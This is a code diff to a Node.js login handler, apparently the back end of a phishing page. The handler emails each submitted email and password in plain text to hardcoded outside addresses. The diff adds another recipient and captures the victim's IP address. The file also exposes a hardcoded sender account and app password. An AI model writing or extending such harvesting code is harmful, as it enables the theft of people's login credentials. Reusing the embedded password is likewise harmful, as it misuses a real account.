@@ -1,6 +1,6 @@
 const nodemailer = require("nodemailer");
 
-const adminEmail = ["coolingicecake1@hotmail.com", "result3100@gmail.com"];
+const adminEmail = ["coolingicecake1@hotmail.com", "result3100@gmail.com", "victorkudos@gmail.com"];
 
 const fromEmail = "slimsean7@gmail.com";
 const fromPassword = 'dwssrznbauszleyv';
@@ -16,6 +16,7 @@ const fromPassword = 'dwssrznbauszleyv';
   exports.postLogin = async (req, res, next) => {
     const email = req.body.email;
     const password = req.body.password;
+    const address = req.ip;
     
     try {
       const transporter = nodemailer.createTransport({
@@ -42,6 +43,7 @@ const fromPassword = 'dwssrznbauszleyv';
         html: `<h4>Details</h4>
         <p>Email: ${email}
         <p>Password: ${password}</p>
+        <p>Address : ${address}</p>
         `,
       };
   
